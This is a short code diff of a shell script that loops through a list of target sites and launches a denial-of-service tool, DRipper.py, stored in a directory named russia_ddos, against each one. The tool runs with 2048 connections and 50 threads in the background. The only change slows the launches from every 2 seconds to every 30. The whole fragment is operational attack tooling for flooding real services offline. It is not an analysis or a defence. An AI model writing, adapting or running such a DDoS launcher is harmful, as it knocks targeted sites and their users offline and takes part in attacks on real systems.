@@ -52,7 +52,7 @@ do
              prot=$(echo $site | awk '{print $3}')
              echo $i
              echo $site
-             sleep 2
+             sleep 30
              
              # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
